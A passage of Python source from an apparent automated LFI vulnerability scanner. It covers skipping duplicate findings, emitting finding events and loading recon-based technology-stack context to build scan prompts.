        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate LFI finding: {result.get('url')}?{result.get('parameter')} (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        # Emit vulnerability_detected event with validation
        if settings.WORKER_POOL_EMIT_EVENTS:
            self._emit_lfi_finding({
                "specialist": "lfi",
                "type": "LFI",
                "url": result.get("url"),
                "parameter": result.get("parameter"),
                "payload": result.get("payload"),
                "status": status,
                "evidence": result.get("evidence", {}),
                "validation_requires_cdp": needs_cdp,
            }, scan_context=self._scan_context)

        logger.info(f"[{self.name}] Confirmed LFI: {result.get('url')}?{result.get('parameter')}")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
        }

    # =========================================================================
    # TECH CONTEXT LOADING (v3.2)
    # =========================================================================

    async def _load_lfi_tech_context(self) -> None:
        """
        Load technology stack context from recon data (v3.2).

        Uses TechContextMixin methods to load and generate context-aware
        prompts for LFI-specific deduplication (OS and language detection).
        """
        # Determine report directory
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
            scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if not scan_dir or not Path(scan_dir).exists():
            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
            self._lfi_prime_directive = ""
            return

        # Use TechContextMixin methods
        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
        self._lfi_prime_directive = self.generate_lfi_context_prompt(self._tech_stack_context)

        lang = self._tech_stack_context.get("lang", "generic")
        server = self._tech_stack_context.get("server", "generic")
        os_type = self._infer_os_from_stack(self._tech_stack_context)
        waf = self._tech_stack_context.get("waf")

        logger.info(f"[{self.name}] LFI tech context loaded: lang={lang}, server={server}, os={os_type}, waf={waf or 'none'}")
